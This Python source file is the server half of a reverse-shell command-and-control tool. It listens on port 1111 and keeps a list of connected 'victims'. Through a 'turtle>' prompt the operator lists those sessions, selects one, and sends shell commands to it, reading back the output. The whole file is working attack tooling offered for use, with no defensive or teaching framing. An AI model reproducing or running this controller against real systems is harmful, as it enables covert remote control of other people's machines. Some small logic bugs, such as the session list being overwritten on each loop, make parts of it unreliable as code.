import sys
import time
import socket
import threading
from queue import Queue

queue=Queue()
JOB_NUMBER=[1,2]
NUMBER_OF_THREADS=2

ALL_CONNECTIONS=[]
ALL_ADRESSES=[]

def create_socket():
    try:
        global s,port,host
        s=socket.socket()
        host=""
        port=1111
    except socket.error as msg:
        print("Error :",str(msg))

def bind_socket():
    try:
        global s, port, host
        print("Binding the Port: ",str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Error",str(msg),"Retryinggggggggg")
        bind_socket()


def accepting_connection():
    for i in ALL_CONNECTIONS:
        i.close()

    del ALL_CONNECTIONS[:]
    del ALL_ADRESSES[:]

    while True:
        try:
            conn, adress = s.accept()
            s.setblocking(1)
            ALL_CONNECTIONS.append(conn)
            ALL_ADRESSES.append(adress)

            print("Connection has beeb established : ",adress[0])
        except:
            print("Error!!!")

def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd=='list':
            list_connections()
        elif 'select' in cmd:
            conn=get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Errorrrr!!!!!")

def list_connections():
    victims=''

    for i,conn in enumerate(ALL_CONNECTIONS):
        try:
            conn.send(str.encode(' '))
            conn.recv(102400)
        except:
            del ALL_CONNECTIONS[i]
            del ALL_ADRESSES[i]
            continue

        victims=str(i)+"-----"+str(ALL_ADRESSES[i][0])+"-----"+str(ALL_ADRESSES[i][1]) + "\n"

    print("All Available Sessions\n",victims)

def get_target(cmd):
    try:
        target=cmd.replace('select','')
        target=int(target)
        conn=ALL_CONNECTIONS[target]
        print("Connected to ------",str(ALL_ADRESSES[target][0]))
        print(str(ALL_ADRESSES[target][0])+">",end="")
        return conn
    except:
        print("Error!!!!!")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(102400), 'utf-8')
                print(client_response, end="")
        except:
            print("Error!!!!!")
            break

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()
def work():
    while True:
        x=queue.get()

        if x==1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x==2:
            start_turtle()
def create_jobs():
    for i in JOB_NUMBER:
        queue.put(i)

    queue.join()

create_workers()
create_jobs()